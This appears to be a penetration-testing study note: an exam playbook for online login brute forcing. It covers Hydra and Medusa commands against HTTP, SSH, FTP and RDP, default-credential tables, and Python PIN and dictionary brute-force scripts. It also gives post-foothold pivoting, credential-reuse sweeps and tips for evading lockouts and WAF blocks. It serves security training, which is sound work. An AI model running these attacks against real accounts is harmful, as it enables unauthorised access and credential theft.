# NOTE — Login Brute Forcing Pentest Methodology (Exam Playbook)

## ID
704

## Module
Login Brute Forcing

## Kind
methodology

## Title
Login Brute Forcing — Full Pentest Methodology

## Description
End-to-end exam-ready playbook for online login brute forcing: service recon → defaults → wordlist tailoring → tool selection (Hydra / Medusa / custom) → per-protocol attack → credential pivot. Use as a decision tree under time pressure.

## Tags
methodology, brute-forcing, login-attacks, hydra, medusa, password-spraying, exam, cheatsheet, decision-tree, credential-stuffing

---

## TL;DR — The 6-Phase Flow

1. **Identify** the auth surface — what protocol, what port, basic-auth vs form, known username or not.
2. **Try defaults / known creds first** — `admin:admin`, leaked dumps, vendor defaults — before burning hours on a wordlist.
3. **Tailor the wordlist** to the target's password policy with `grep -E` filters and to the target's people with `username-anarchy` / CUPP.
4. **Pick the tool** — Hydra for almost everything, Medusa as fallback (especially when dropped on a compromised host), custom Python only when no module fits (PIN endpoints, JSON APIs, weird CSRF flows).
5. **Run the attack** with `-f` to stop on first hit, sane parallelism, and the *exact* failure/success string.
6. **Pivot** — every cracked credential opens new internal services; SSH in, `netstat`, brute-force the next hop.

> **Golden rule:** Always send one *failed* login first and capture the exact response (status code, redirect, error string). Hydra's `F=` / `S=` condition is the #1 reason a "working" command finds nothing.

---

## Phase 1 — Recon & Auth Surface ID

### Identify the service before brute forcing
Port number ≠ protocol. A box on `:80` may speak something else entirely.

```bash
nmap -sV -p- <TARGET>                      # service version on every port
curl -i http://<TARGET>:<PORT>/             # confirm HTTP / capture banner
# "Received HTTP/0.9 when not allowed" → NOT http; pivot to nmap -sV
```

### Classify the auth mechanism
| Signal | Mechanism | Hydra module |
|---|---|---|
| Browser pops a native username/password dialog | HTTP Basic Auth | `http-get` |
| HTML form, POST request to `/login` etc. | HTTP POST form | `http-post-form` |
| Port 22 banner `SSH-2.0-...` | SSH | `ssh` |
| Port 21 banner `220 ... FTP` | FTP | `ftp` |
| Port 3389 / Win RDP cert | RDP | `rdp` |
| Port 3306 / `MySQL` banner | MySQL | `mysql` |
| Custom JSON / numeric PIN endpoint | Custom | Python script |

### Capture the form (POST-form targets)
1. Open the page → DevTools → **Network tab**.
2. Submit any wrong creds.
3. Find the POST request → note:
   - **Path** (`action=` value, e.g. `/login`)
   - **Field names** (`username` vs `user` vs `email`; `password` vs `pass`)
   - **Failure string** in the response body (e.g. `Invalid credentials`)
4. That string goes verbatim after `F=` in the Hydra options.

### Know the username already?
- Lab clue (`basic-auth-user`, `sshuser`, `ftpuser`).
- Found a name in earlier loot (a report, an email signature)? → run `username-anarchy "First Last"` to generate every plausible login form.
- Pure unknown? → `top-usernames-shortlist.txt` from SecLists.

---

## Phase 2 — Pre-Attack Checks (Don't Skip)

### 2.1 Defaults first
Before any wordlist runs, try these by hand or with a tiny list:

| Service | Try |
|---|---|
| Web admin panels | `admin:admin`, `admin:password`, `admin:`, `:admin` |
| Routers (Linksys/D-Link/Netgear) | `admin:admin`, `admin:password` |
| Cisco | `cisco:cisco` |
| Ubiquiti | `ubnt:ubnt` |
| Hikvision DVR | `admin:12345` |
| Axis cameras | `root:pass` |
| MySQL fresh install | `root:` (empty) |
| FTP | `anonymous:anonymous`, `ftp:ftp` |
| Hardware appliances | check vendor service manuals — backdoor accounts |

Even when the *password* was changed, the *username* often wasn't — keep `admin` / `root` / vendor defaults at the top of `usernames.txt`.

### 2.2 Lockout reconnaissance
- Read the password policy if visible (registration page, SMB null session, AD policy).
- Submit 3–5 deliberate fails on a throwaway username — does the account lock? Does the IP block?
- If lockouts are real → switch from per-account brute force to **password spraying** (one weak password vs many usernames; low-and-slow with delays).

### 2.3 Empty / null password test (Medusa)
```bash
medusa -h <IP> -U usernames.txt -e ns -M <module>
# -e n  = try empty password
# -e s  = try password = username
# -e ns = both
```
Catches the dumbest configs in seconds and does NOT need a password file.

---

## Phase 3 — Wordlist Tailoring

### 3.1 Filter to the password policy
If the policy is "min 8 chars, upper, lower, digit", every password failing those filters is wasted bandwidth. Chain `grep -E`:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt

grep -E '^.{8,}$'   darkweb2017_top-10000.txt > pw-1-len.txt   # min length 8
grep -E '[A-Z]'     pw-1-len.txt              > pw-2-upper.txt # has uppercase
grep -E '[a-z]'     pw-2-upper.txt            > pw-3-lower.txt # has lowercase
grep -E '[0-9]'     pw-3-lower.txt            > pw-4-digit.txt # has digit
wc -l pw-4-digit.txt   # ~89 of 10000 survive — that's the real list
```

Build the regex set from the actual policy you saw — extra symbol class? Add `grep -E '[^A-Za-z0-9]'`.

### 3.2 Generate target-specific lists

```bash
# Username permutations from a real name
./username-anarchy FirstName LastName > usernames.txt

# Personal-info-driven password list (interactive — birthdate, kids, pets, etc.)
cupp -i
```

`username-anarchy` produces every common login format (`flast`, `first.last`, `firstl`, `fl`, …). Required when you have a name but no login. CUPP is for password generation around a known person.

### 3.3 Ready-made SecLists on Pwnbox
`/opt/useful/seclists/` already has the lot. Use these paths instead of `wget`-ing fresh copies:

| Use | Path |
|---|---|
| Top usernames (short) | `/opt/useful/seclists/Usernames/top-usernames-shortlist.txt` |
| 2023 top 200 passwords | `/opt/useful/seclists/Passwords/2023-200_most_used_passwords.txt` |
| 500 worst | `/opt/useful/seclists/Passwords/Common-Credentials/500-worst-passwords.txt` |
| Darkweb2017 10k | `/opt/useful/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt` |
| `rockyou.txt` | `/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt` |

---

## Phase 4 — Tool Selection

| Situation | Tool | Why |
|---|---|---|
| Anything network protocol over external link | **Hydra** | Ubiquitous, every CPTS lab assumes it |
| Dropped on compromised box, only `apt`/`yum` available | **Medusa** | Often present where Hydra isn't; same coverage |
| Need to test multiple hosts in parallel from one command | **Medusa** with `-H hosts.txt` | Built-in host list flag (`hydra -M` works too) |
| Custom JSON / numeric PIN / weird CSRF | **Python `requests`** | Hydra can't model multi-step flows |
| Offline hash cracking | Hashcat / John (different module) | Out of scope here |

### Hydra core syntax
```
hydra [LOGIN_OPTS] [PASSWORD_OPTS] [SERVICE_OPTS] <target> <module> [<module args>]

-l USER  / -L USERFILE       # single user / list
-p PASS  / -P PASSFILE       # single pass / list
-s PORT                      # non-default port
-t N                         # parallel tasks (default 16)
-f                           # stop after first valid hit
-V / -vV                     # verbose / very verbose
-M targets.txt               # multi-host
-x MIN:MAX:CHARSET           # generate-on-the-fly (e.g. 6:8:abc...0-9)
```

### Medusa core syntax
```
medusa -h HOST  | -H HOSTFILE
       -u USER  | -U USERFILE
       -p PASS  | -P PASSFILE
       -M MODULE                   # ssh / ftp / http / rdp / mysql / smbnt ...
       -m MODULE_OPTION             # repeatable, module-specific
       -n PORT                      # non-default port
       -t THREADS
       -e ns                        # try null + same-as-username
       -f / -F                      # stop on first hit (per host / globally)
```

---

## Phase 5 — Service-Specific Attacks

### 5.1 HTTP Basic Auth (`http-get`)
Browser pops a native auth dialog → it's Basic Auth. Username often known; only password to crack.

```bash
hydra -l basic-auth-user \
      -P /opt/useful/seclists/Passwords/2023-200_most_used_passwords.txt \
      <TARGET_IP> http-get / -s <PORT>
```
After a hit, log in via browser to `http://<IP>:<PORT>/` for the flag.

### 5.2 HTTP POST Form (`http-post-form`)
The condition string makes or breaks this attack:

```
"<PATH>:<POST_BODY>:<CONDITION>"
   PATH       e.g. /login   or   /
   POST_BODY  with placeholders ^USER^ and ^PASS^
   CONDITION  F=<failure_string>   OR   S=<success_indicator>
              (S=302 for redirect-on-success is also common)
```

Working example (failure string match):
```bash
hydra -L /opt/useful/seclists/Usernames/top-usernames-shortlist.txt \
      -P /opt/useful/seclists/Passwords/2023-200_most_used_passwords.txt \
      -f <TARGET_IP> -s <PORT> \
      http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

When in doubt, **submit one failed login and copy the exact error text** — including capitalization and trailing punctuation.

### 5.3 SSH
```bash
# Hydra
hydra -l sshuser -P 2023-200_most_used_passwords.txt <IP> -s <PORT> ssh

# Medusa (especially from a compromised host)
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
Throttle threads (`-t 3` or `-t 4`). SSH daemons rate-limit aggressively; high parallelism causes false negatives and lockouts.

### 5.4 FTP
```bash
hydra -L usernames.txt -P passwords.txt -s 21 -V ftp.example.com ftp
medusa -h 127.0.0.1 -u ftpuser -P /tmp/passwords.txt -M ftp -t 5
```
FTP is frequently bound to `localhost` only — see Phase 6 pivot.

### 5.5 RDP (Windows)
```bash
hydra -l administrator \
      -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
      192.168.1.100 rdp
```
`-x MIN:MAX:CHARSET` for on-the-fly generation when a wordlist won't fit the policy.

### 5.6 Multi-host SSH (Hydra)
```bash
hydra -l root -p toor -M targets.txt ssh
```

### 5.7 Custom — 4-digit PIN endpoint
Hydra has no module → 30 lines of Python:

```python
import requests
ip, port = "<IP>", <PORT>
for pin in range(10000):
    formatted = f"{pin:04d}"
    r = requests.get(f"http://{ip}:{port}/pin?pin={formatted}")
    if r.ok and 'flag' in r.json():
        print(f"PIN: {formatted}  flag: {r.json()['flag']}"); break
```

### 5.8 Custom — dictionary against a JSON/POST endpoint
```python
import requests
ip, port = "<IP>", <PORT>
pwds = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/"
    "Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()
for p in pwds:
    r = requests.post(f"http://{ip}:{port}/dictionary", data={'password': p})
    if r.ok and 'flag' in r.json():
        print(f"PASS: {p}  flag: {r.json()['flag']}"); break
```

---

## Phase 6 — Post-Credential Pivot

Cracking the first credential is **never** the end. Each foothold leaks more.

### 6.1 SSH foothold → internal enumeration
```bash
ssh sshuser@<IP> -p <PORT>

# Inside the host
netstat -tulpn | grep LISTEN     # listening services + PIDs
ss -tlnp                          # modern equivalent
nmap localhost                    # external view of the loopback
ls /home/                         # user accounts → username candidates
cat /home/*/IncidentReport.txt    # CTF clue files
ls ~/username-anarchy/ 2>/dev/null
```

### 6.2 Brute internal services from inside
External nmap shows port 21 *filtered*? It's bound to `127.0.0.1`. Move the wordlist in and attack from inside:

```bash
# From Pwnbox
scp -P <PORT> 2020-200_most_used_passwords.txt sshuser@<IP>:/tmp/

# From SSH session
medusa -h 127.0.0.1 -u ftpuser -P /tmp/2020-200_most_used_passwords.txt -M ftp -t 5

# Or Hydra with generated usernames
./username-anarchy "First Last" > /tmp/users.txt
hydra -L /tmp/users.txt -P /tmp/passwords.txt localhost ftp
```

### 6.3 Retrieve the flag
```bash
ftp ftp://<user>:<pass>@localhost
# ftp> get flag.txt
# ftp> exit
cat flag.txt
```

### 6.4 Credential reuse sweep
The cracked password almost always appears elsewhere. Replay it against:
- Other services on the same host (web admin, MySQL, Redis).
- Other hosts in the subnet (especially via SMB, RDP, WinRM).
- The corporate VPN, Outlook Web, GitLab, Confluence — anything seen during recon.

---

## Decision Tree (Under Exam Pressure)

```
Auth target identified
│
├── Defaults (admin:admin, vendor list, empty pass)?
│   ├── Hit  → DONE — pivot (Phase 6)
│   └── Miss → continue
│
├── Lockout policy in place?
│   ├── Yes → password spraying (1 pass × N users, slow rate)
│   └── No  → standard brute force
│
├── Username known?
│   ├── Yes → -l <user>     -P passwords.txt
│   ├── Have a real name → username-anarchy → -L users.txt
│   └── Unknown → top-usernames-shortlist.txt → -L users.txt
│
├── Pick wordlist
│   ├── Policy known     → grep -E filter chain (len, U, l, d, sym)
│   ├── Personal target  → cupp -i
│   └── Generic web      → 2023-200_most_used_passwords.txt / 500-worst-passwords.txt
│
├── Service?
│   ├── Browser dialog        → hydra http-get        (Basic Auth)
│   ├── HTML form             → DevTools → capture POST → hydra http-post-form
│   │                           "/:user=^USER^&pass=^PASS^:F=<exact error>"
│   ├── SSH                   → hydra -l u -P p <ip> -s <port> ssh   (-t 3-4)
│   ├── FTP                   → hydra ... ftp        OR  anonymous:anonymous first
│   ├── RDP                   → hydra ... rdp        (consider -x MIN:MAX:CHARSET)
│   ├── Multi-host SSH        → hydra -M targets.txt ssh
│   ├── Custom JSON / PIN     → Python requests loop
│   └── Compromised box only  → medusa (ubiquitous on internal hosts)
│
├── No hits?
│   ├── Re-check F=/S= condition (capture a fresh failed login)
│   ├── Re-check field names (username vs user vs email)
│   ├── Drop -t below 4 (rate limit / lockout masking)
│   ├── Confirm service version (curl -i / nmap -sV — was it really HTTP?)
│   └── Try an empty password (medusa -e ns)
│
└── Hit! → log in manually → enumerate → pivot to next service (Phase 6)
```

---

## Filter / Signal → Bypass Reference

| Signal observed | Likely cause | Counter-move |
|---|---|---|
| `Received HTTP/0.9 when not allowed` | Port isn't HTTP at all | `nmap -sV -p <port>` to ID the real service |
| Hydra finds creds but they don't actually log in | Wrong `F=` / `S=` — false-positive on every attempt | Capture a real failed login, copy error string verbatim |
| Hydra finds NO creds when one is known to work | `F=` matches the success page too, or wrong field name | Inspect raw POST body in DevTools; widen / narrow condition |
| Account locked after ~5 attempts | Lockout policy active | Switch to password spraying; lower `-t`; randomize order |
| External nmap shows port filtered | Service bound to `127.0.0.1` only | SSH in, attack from inside against `localhost` |
| Hydra crawls and times out | Too many threads vs server limit | Drop `-t` to 3-4 (esp. SSH, RDP) |
| `403 Forbidden` on every Hydra attempt | WAF / IP block triggered | Switch source IP, slow down, check for CSRF token |
| Empty / 200 response on bad creds | App returns same body for failure & success | Use `S=302` redirect or content-length diff instead |
| Login form has CSRF token | `^USER^/^PASS^` form-only flow won't work | Custom Python with session + token re-fetch each request |
| Hydra `http-get` errors out | Form auth, not Basic Auth | Switch to `http-post-form` |
| `ftp anonymous` works | No brute force needed | Log in with `anonymous:anonymous`, get flag |
| `medusa: error opening module` | Module not compiled in | `apt-get install medusa` (or fall back to Hydra) |
| Hydra command hangs on first attempt | DNS / target wrong | Use IP not hostname; ping first |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 1: HTTP Basic Auth, known user ===
hydra -l basic-auth-user \
      -P /opt/useful/seclists/Passwords/2023-200_most_used_passwords.txt \
      <IP> http-get / -s <PORT>

# === Scenario 2: HTTP POST form ===
# 1. DevTools → Network → submit wrong creds → copy error string + field names
hydra -L /opt/useful/seclists/Usernames/top-usernames-shortlist.txt \
      -P /opt/useful/seclists/Passwords/2023-200_most_used_passwords.txt \
      -f <IP> -s <PORT> \
      http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# === Scenario 3: SSH, single user, throttled ===
hydra -l sshuser -P 2023-200_most_used_passwords.txt <IP> -s <PORT> ssh -t 4

# === Scenario 4: FTP, anonymous first, then brute ===
ftp ftp://anonymous:anonymous@<IP>           # try freebie
hydra -L users.txt -P passwords.txt -s 21 -V <IP> ftp

# === Scenario 5: RDP with on-the-fly generation ===
hydra -l administrator \
      -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
      <IP> rdp

# === Scenario 6: Multi-host SSH with one cred pair ===
hydra -l root -p toor -M targets.txt ssh

# === Scenario 7: Wordlist filter to policy ===
grep -E '^.{8,}$' darkweb2017_top-10000.txt | \
  grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > policy-pw.txt

# === Scenario 8: Username permutations from a real name ===
./username-anarchy "John Smith" > usernames.txt

# === Scenario 9: Empty / null password fast-test ===
medusa -h <IP> -U usernames.txt -e ns -M ssh

# === Scenario 10: Pivot — internal FTP after SSH foothold ===
ssh sshuser@<IP> -p <PORT>
netstat -tulpn | grep LISTEN
ls /home/                                            # spot ftpuser
# from Pwnbox in another terminal:
scp -P <PORT> /opt/useful/seclists/Passwords/2020-200_most_used_passwords.txt sshuser@<IP>:/tmp/
# back inside SSH:
medusa -h 127.0.0.1 -u ftpuser -P /tmp/2020-200_most_used_passwords.txt -M ftp -t 5
ftp ftp://ftpuser:<cracked>@localhost
# ftp> get flag.txt

# === Scenario 11: 4-digit PIN brute (custom Python) ===
python3 - <<'EOF'
import requests
ip, port = "<IP>", <PORT>
for pin in range(10000):
    p = f"{pin:04d}"
    r = requests.get(f"http://{ip}:{port}/pin?pin={p}")
    if r.ok and 'flag' in r.json():
        print(p, r.json()['flag']); break
EOF

# === Scenario 12: Dictionary against custom POST endpoint ===
python3 - <<'EOF'
import requests
ip, port = "<IP>", <PORT>
words = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()
for w in words:
    r = requests.post(f"http://{ip}:{port}/dictionary", data={'password': w})
    if r.ok and 'flag' in r.json():
        print(w, r.json()['flag']); break
EOF
```

---

## Top Gotchas (Things That Will Burn You)

1. **Always verify the service** — port 80 doesn't guarantee HTTP. `curl -i` returns `HTTP/0.9 when not allowed` → run `nmap -sV` before wasting Hydra cycles.
2. **Hydra `F=` / `S=` must match the EXACT failure string** — capture a real failed login first; copy capitalization and punctuation. Wrong condition = either no hits or every guess is a false positive.
3. **Field names trip you up** — `username` vs `user` vs `email`, `password` vs `pass`. Always inspect the actual POST body in DevTools.
4. **Account lockout after 3-5 attempts** is silent — Hydra keeps "succeeding" against locked accounts. Test the policy with throwaway creds before mass attacks.
5. **`-t` too high on SSH/RDP** causes false negatives, the daemon throttles or drops connections. Drop to `-t 3` or `-t 4`.
6. **External nmap shows port 21 filtered** — FTP is almost certainly bound to `localhost`. Don't keep retrying externally; SSH in and attack from inside.
7. **Wordlist policy mismatch** — running rockyou (mostly short, lowercase) against an "8+ chars, mixed-case + digit" policy means 99% of guesses are pre-rejected. Filter first with `grep -E`.
8. **Default username sticks even when password changed** — keep `admin`, `root`, `cisco`, `ubnt` at the top of every users.txt. The policy rarely forces username changes.
9. **CSRF tokens break `http-post-form`** — Hydra can't refresh tokens between attempts. Drop to a Python `requests.Session()` that re-fetches the token each loop.
10. **`anonymous:anonymous` on FTP** — try it before any brute force. Free win on misconfigured boxes.
11. **`medusa -e ns`** is a 5-second sanity check — try empty password and password-equals-username before committing to a wordlist run.
12. **Pwnbox already has SecLists** at `/opt/useful/seclists/` — don't `wget` fresh copies; use the local paths.
13. **`username-anarchy` may not be pre-installed** — in skills assessments it's often dropped in the home directory after the SSH foothold. `ls ~/username-anarchy/` after every login.
14. **Hydra hostname vs IP** — DNS quirks make hostnames silently fail; always use the IP after `ping` confirms reachability.
15. **Mind the port flag spelling** — Hydra uses `-s <port>`, Medusa uses `-n <port>`. They are NOT interchangeable.
16. **Forgetting `-f`** burns through the wordlist after a hit. Always include it unless you specifically want every valid pair.
17. **Skills-assessment chains** — each cracked credential is a stepping stone, not the goal. After every hit: `netstat`, `/home/`, look for breadcrumbs (`IncidentReport.txt`, `passwords.txt`).
18. **MFA-protected target** = brute forcing the password is wasted time. Recognize it early (TOTP prompt, push notification) and pivot to MFA bypass / session theft.

---

## Reference Wordlists & Resources

| Use case | Resource / Path |
|---|---|
| Top usernames (short) | `/opt/useful/seclists/Usernames/top-usernames-shortlist.txt` |
| 2023 top 200 passwords | `/opt/useful/seclists/Passwords/2023-200_most_used_passwords.txt` |
| 500 worst passwords | SecLists `Passwords/Common-Credentials/500-worst-passwords.txt` |
| Darkweb 2017 top 10k | SecLists `Passwords/Common-Credentials/darkweb2017_top-10000.txt` |
| `rockyou.txt` | `/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt` |
| Default credentials | SecLists `Passwords/Default-Credentials/` |
| Username permutations | `username-anarchy` — `https://github.com/urbanadventurer/username-anarchy` |
| Personal-info password generator | `cupp -i` |
| Hydra reference | `hydra -h` / `man hydra` |
| Medusa reference | `medusa -h` / `medusa -d` (list modules) |

---

## Related Vault Notes

- `01-intro.md` — brute-force theory, attack types, MITRE mapping
- `02-password-security.md` — strong vs weak passwords, default creds, NIST guidance
- `03-pin-cracking.md` — Python brute force of a 4-digit PIN endpoint
- `04-dictionary-attacks.md` — Python dictionary attack with SecLists wordlist
- `05-hybrid-attacks.md` — wordlist filtering with `grep -E` against a policy
- `06-hydra.md` — Hydra installation, syntax, modules
- `07-basic-http-auth.md` — Hydra `http-get` against Basic Auth
- `08-hydra-http-post-form.md` — Hydra `http-post-form` with failure-string condition
- `09-medusa.md` — Medusa syntax, modules, `-e ns`
- `10-ssh-ftp-brute.md` — SSH crack → internal pivot → FTP crack
- `11-module-summary.md` — Skills assessment walkthrough (HTTP Basic → SSH → FTP)
